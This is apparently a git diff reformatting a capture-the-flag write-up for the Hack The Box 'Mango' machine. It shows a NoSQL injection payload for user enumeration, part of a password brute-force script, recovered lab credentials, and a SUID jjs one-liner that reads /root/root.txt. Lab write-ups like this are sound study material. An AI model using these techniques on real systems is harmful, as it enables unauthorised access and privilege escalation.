@@ -30,16 +30,19 @@ I can enumerate users by using username=toto&password[$ne]=toto and replacing th
 
 ## Cracking the Perimeter
 
-Used cewl to build a wordlist of users, added the admin
-	Mango
-	mango
-	Sweet
-	sweet
-	Juicy
-	juicy
-	Admin
-	admin
-	admin.htb
+Used cewl to build a wordlist of users, added the following
+```
+admin
+Mango
+mango
+Sweet
+sweet
+Juicy
+juicy
+Admin
+admin
+admin.htb
+```
 ```
 import json, requests, urllib3, string, urllib
 
@@ -88,15 +91,15 @@ for i in range(0,len(userlist)):
 	print(str("%s's password is %s" % (userlist[i],passlist[i])))
 ```
 
-
 admin and mango are users (case sensitive)
-mango's password is h3mXK8RhU~f{]f5H
-admin's password is t9KcS3>!0B#2
-ssh:mango:h3mXK8RhU~f{]f5H
-local:admin:t9KcS3>!0B#2
+mango's password is `h3mXK8RhU~f{]f5H`
+admin's password is `t9KcS3>!0B#2`
+
+`ssh:mango:h3mXK8RhU~f{]f5H`
+`local:admin:t9KcS3>!0B#2`
 
 ## Privilege Escalation
 
 SUID on jjs, root owns, admin can run
 
-echo 'var BufferedReader = Java.type("java.io.BufferedReader");var FileReader = Java.type("java.io.FileReader");var br = new BufferedReader(new FileReader("/root/root.txt"));while ((line = br.readLine()) != null) { print(line); }' | jjs
+`echo 'var BufferedReader = Java.type("java.io.BufferedReader");var FileReader = Java.type("java.io.FileReader");var br = new BufferedReader(new FileReader("/root/root.txt"));while ((line = br.readLine()) != null) { print(line); }' | jjs`
